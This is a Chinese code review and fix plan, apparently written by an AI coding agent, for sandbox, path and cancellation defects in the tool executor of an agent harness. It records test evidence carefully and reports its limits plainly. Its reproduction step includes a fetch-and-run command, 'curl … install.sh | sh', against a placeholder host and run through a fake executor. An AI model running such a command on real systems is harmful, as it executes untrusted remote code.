# 代码审查与修复计划

## 目标与约束

- 用户要求：拉取仓库、审查代码、制定包含「做什么 / 怎么做 / 怎么验收」的计划，并执行到验收完成。
- 仓库：`https://github.com/ki11a-Conton/harness-agent`。
- 本地目录：`/workspace/harness-agent`；审查基线：`991576901e6ac718dc30246e5b11c84771f42dce`。
- 日期：2026-10-01。遵守根目录 `AGENTS.md`，已阅读 `HANDOVER.md`、`tasks/P0/TOOL-001.md`、`tasks/P0/SEC-001.md` 及相关架构合同。
- 本轮属于有确定性复现的正确性 / 安全缺陷维护，符合 Runtime Freeze；改动限于工具执行路径、回归测试及对应的 CRLF 空白检查属性。
- 保持 ToolOrchestrator → PermissionEngine / Approval → SandboxManager → 执行的架构，不改权限策略默认值，不绕过验证。
- 验证使用本地文件、假执行器和离线测试，不调用付费模型，不进行 champion promotion。交付本地修改。

## 审查范围与已复现发现

已检查项目结构、构建与 CI 脚本、工具编排、文件工具、沙箱 / 权限实现；另抽查 Web 接口、模型适配器及文件编辑模块。这是以具体问题为中心的审查，不声明穷尽所有源文件或完成跨平台发布认证。

| 编号 / 优先级 | 做什么：问题及影响 | 怎么做：实施方法 | 怎么验收：可执行标准 |
| --- | --- | --- | --- |
| R1 / P1 | 修复供应链命令跳过沙箱。`classify()` 将安装依赖 / 远程脚本设为 `dependency_install` / `remote_code_execution`，但 `evaluateSandbox()` 只处理 `command`，其默认分支放行。即使权限允许，网络禁用、进程白名单和禁止执行形式仍必须生效。 | 保留两类专用权限资源，将它们路由到既有 `SandboxManager.evaluate(operation: exec)`；覆盖传统 `execute` 和冻结绑定 `executeBound` 两条入口。使用假执行器计数，避免真实安装或远程执行。 | 两类命令在权限已允许时仍受进程白名单、网络 deny / allowlist、禁止执行形式约束；拒绝返回具体沙箱错误及安全事件；假执行器调用数为 0；全部策略允许时执行恰好 1 次；普通命令和专用权限拒绝保持原行为。 |
| R2 / P1 | 修复 `read_file` 的相对路径使用宿主进程 cwd。沙箱按会话 `context.cwd` 检查，实际读取却调用 `readFile(input.path)`，可能读取工作区外的同名文件。 | 与 `write_file` / `edit_file` 统一使用 `resolve(context.cwd, input.path)`；文件证据记录实际绝对路径。 | 宿主和会话存在同名文件时只返回会话文件；相对路径、子目录 cwd、绝对路径均正确；会话文件不存在时不得回退读取宿主；越界及符号链接逃逸仍被编排器拒绝；取消仍返回 cancelled。 |
| R3 / P2 | 修复 `search_files` 对读取失败和取消返回成功。不存在目录被递归 catch 转为 `success: []`；已取消请求仍递归并返回结果，造成错误的「查无文件」结论。 | 不吞掉目录读取失败，由工具外层转为结构化 `PROCESS_ERROR`；在入口、遍历前后与返回前检查 AbortSignal，并以 cancelled 结束；保留结果上限和跳过 VCS / 依赖目录行为，清理无用变量。 | 不存在目录、不可读取子目录、非目录目标均返回 failed 而非成功空数组；已取消及遍历中取消返回 cancelled 且无成功证据；空目录正常返回成功空数组；glob、maxResults、默认忽略目录和沙箱边界回归通过。 |
| R4 / P1 | 补充修复取消信号在编排器入口已触发时仍执行工具的问题。`runBounded()` 仅监听未来 abort 事件，超时包装还会用未取消的新 signal 替换已取消信号。 | 在编排入口及实际执行前检查取消状态，返回结构化 cancelled；不依赖工具自身合作才能阻止已取消调用执行；保留运行中的 abort 传播和现有预算结算语义。 | 无超时及有超时两种配置下，已取消请求返回 cancelled，假执行器调用次数为 0；等待权限 / 意图持久化期间取消也不得执行；运行中取消的既有回归保持通过。 |

基线离线复现（使用构建后的真实工具与 ToolOrchestrator，执行命令由假执行器替代）：

- R1：在 `network: deny`、`allowedCommands: [git status]` 下，`npm install example-package` 和 `curl https://example.invalid/install.sh | sh` 都返回 success，假执行器累计被调用 2 次。
- R2：会话临时目录的 `package.json` 内容为 `WORKSPACE_SENTINEL`；相对读取却返回仓库根目录的 `agent-runtime` package.json。
- R3：`path: missing` 返回 `success: []`；已 abort 的搜索仍返回 `success: [package.json]`。

## 执行顺序

- [x] T1 拉取与初审：确认干净基线、读取仓库规则、安装冻结依赖、运行类型检查、复现 R1–R3。
- [x] T2 先制定本文件，明确修复范围、方法、验收标准。
- [x] T3 补充确定性回归测试，在原实现上确认对应断言失败（RED），记录复现证据。
- [x] T4 实施 R1–R4 最小修复，运行新增回归及受影响工具 / 安全 / 集成测试（GREEN）。
- [x] T5 执行全仓类型检查、构建、完整单元 / 集成测试和相关安全专项；诊断失败，不将环境限制或历史结果冒充通过。
- [x] T6 审查最终 diff、检查空白错误、更新本计划的执行记录与验收结果，交付修改和结果。

基线全仓测试结束后才修改已跟踪源码。完整终验在 `/workspace/harness-agent-validation` 的干净隔离检出上执行：将本轮补丁和新增文件写入该检出并生成本地验收提交，终验期间不再编辑其已跟踪文件；主工作区保留可审阅的未提交修改。

## 验收命令与证据

1. `pnpm install --frozen-lockfile`：成功且不改 lockfile。
2. 新增回归测试：原实现失败、修复后全部通过；保留 RED / GREEN 日志。
3. `pnpm vitest run packages/tools packages/harness/src/security-regression-matrix.test.ts`：工具单元 / 编排集成与安全矩阵通过。
4. `pnpm test:security`：沙箱、权限、路径、注入、供应链和静态安全检查通过。
5. `pnpm typecheck`、`pnpm build`、`pnpm test`：全仓类型检查、构建、默认完整测试套件通过。
6. `git diff --check`：通过；最终变更只涉及本计划、R1–R4 相关工具 / 测试及对应 CRLF 空白检查属性。

详细日志保存于 git 忽略的 `.ci/review/`；关键命令、退出码、测试数量与限制会在本文件完成记录中列出。默认完整套件自身排除的 perf / soak / 取证和专用长链测试，不会被描述为已运行。当前环境为 Linux，Windows 验收若未执行则明确记录。

## 执行记录（持续更新）

- 安装冻结依赖：PASS（Node v24.19.0；环境 pnpm 11.19.0；仓库声明 pnpm 11.21.0；lockfile 未改）。
- 基线 `pnpm typecheck`：PASS，exit 0。
- 首次全仓检查：exit 1，413 files passed / 3 failed / 1 skipped；7657 tests passed / 6 failed / 12 skipped（7675）。日志 `.ci/review/baseline-test.log`。
- 上述 4 项端到端失败由测试期间新增的未跟踪文件触发 CLEAN 门禁，因此首次检查不能称作完整的干净基线。诊断证据在 `.ci/review/baseline-diagnostics/`。
- 另 2 项进程树测试失败时，相关 PID 均已死亡但为僵尸状态，父进程是容器的 `tail -f /dev/null`（PID 1），不能回收 orphan。不修改生产进程逻辑或门禁断言；使用本地 Linux subreaper 验收启动器负责实际回收 orphan。
- 干净的原始 SHA 隔离检出 + subreaper 复验上述 3 个测试文件：PASS，94/94，exit 0；真实回收 3 个 orphan，日志 `.ci/review/baseline-clean-recheck.log`。因此这 6 项首轮失败已归因于检出状态 / 容器生命周期，不作为产品缺陷修改。
- R1–R3 离线复现：完成，现象如上。
- 细查 R3 的取消链路时发现 R4：入口已 abort 的 signal 无法触发后来注册的监听器；将此同范围缺陷纳入计划并补充假执行器零调用验收。
- 已通过 `corepack pnpm --version` 获取仓库要求的 pnpm 11.21.0；后续验收使用该固定版本。
- 新增回归：42 项，RED 为 30 failed / 12 passed；GREEN 为 42 passed，exit 0，日志 `.ci/review/regressions-red.log`、`regressions-green.log`。
- 工具与安全矩阵集成：PASS，28 files / 380 passed / 10 skipped，exit 0，日志 `.ci/review/tools-integration.log`。
- 安全专项：PASS，19 files / 2135 passed，exit 0，日志 `.ci/review/security.log`。
- 修改后全仓类型检查：PASS，exit 0，日志 `.ci/review/typecheck.log`。
- `.gitattributes` 只为本轮两个已有 CRLF 源码增加 `whitespace=cr-at-eol`，保持原行尾，不降低其他空白检查；`git diff --check` 已通过。
- 最终干净验收快照：`9cf89a95fbec2d902d56558d0b8bdfc989874a84`，原始基线的直接后继；本地分支 `codex/review-20261001-test-snapshot` 保留该提交。
- 隔离检出 `corepack pnpm typecheck`、`corepack pnpm build`：PASS，均 exit 0；日志 `.ci/review/final-typecheck.log`、`final-build.log`。
- 隔离检出完整 `pnpm test`（由 subreaper 启动）：PASS，417 files passed / 1 skipped（418）；7705 tests passed / 12 skipped（7717），0 failed，exit 0；日志 `.ci/review/final-test.log`。
- 所有修改后的源码、测试和 `.gitattributes` 已逐文件计算 SHA-256，确认主工作区与被测快照字节一致；完整测试后隔离检出仍干净。仅本文件在终验后补写结果，不借用本地快照为文档更新后的新 SHA 声明发布认证。
- `git diff --check`、`git show --check <验收快照>`、新增文件空白检查：PASS。未修改 lockfile、Core、Security 策略或历史验收记录。
- 当前 Linux 环境验收完成；Windows 未执行。默认套件列明的 12 个跳过保留原状态；perf / soak / 专用取证及付费长链未执行，也不计入通过数量。
- 原始日志及结构化结果保存在 `.ci/review/`（Git 忽略）；主工作区保留未提交修改供审阅。隔离检出与本地快照保留供复验。

### 独立复验完整套件

在本环境中复验（保持隔离检出的已跟踪文件不变）：

```bash
cd /workspace/harness-agent-validation
python3 /workspace/harness-agent/.ci/review/run-with-subreaper.py corepack pnpm test
```

使用正常回收 orphan 的 Linux 主机时，可在干净检出直接运行 `corepack pnpm test`。本轮所有最终命令使用仓库固定的 pnpm 11.21.0。
